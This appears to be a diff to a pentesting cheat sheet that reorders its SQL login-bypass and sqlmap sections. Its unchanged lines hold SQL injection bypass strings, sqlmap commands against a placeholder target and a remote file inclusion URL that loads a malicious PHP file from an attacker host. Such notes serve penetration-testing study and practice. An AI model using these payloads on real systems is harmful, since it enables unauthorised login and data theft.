@@ -3,7 +3,6 @@
 - DNS-Domain name:
 - Host name:
 - OS:
-- Server:
 - Kernel:
 - Workgroup:
 - Windows domain:
@@ -303,18 +302,7 @@ http://INSERTIPADDRESS/page=http://MYIPADDRESS/maliciousfile.php
 ### Sql-login-bypass
 
 ```
-- Open Burp-suite
-- Make and intercept a request
-- Send to intruder
-- Cluster attack.
-- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
-- Attack
-- Check for response length variation
-```
-
-### SQL-Injection
-
-```# Login Bypass
+# Login Bypass Checks
 Username/Password: 
 1' or '1'='1 
 1' or 1=1 LIMIT 1;# 
@@ -323,8 +311,22 @@ Username/Password:
 'or '1'='1' ({
 'or '1'='1' /*
 
+# Automated
+- Open Burp-suite
+- Make and intercept request
+- Send to intruder
+- Cluster attack
+- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
+- Attack
+- Check for response length variation
+```
+
+### SQL-Injection
+
+```
 # Post
-./sqlmap.py -r search-test.txt -p tfUPass
+get post request from Burp and save as search-test.txt
+sqlmap -r search-test.txt -p tfUPass
 
 # Get
 sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql
@@ -338,15 +340,6 @@ sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
 ```
 cewl http://INSERTIPADDRESS
 ```
-
-## Vulnerability analysis
-
-Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilites and features.
-
-### To try - List of possibilies
-Add possible exploits here:
-
-
 
 ### Find sploits - Searchsploit and google
 
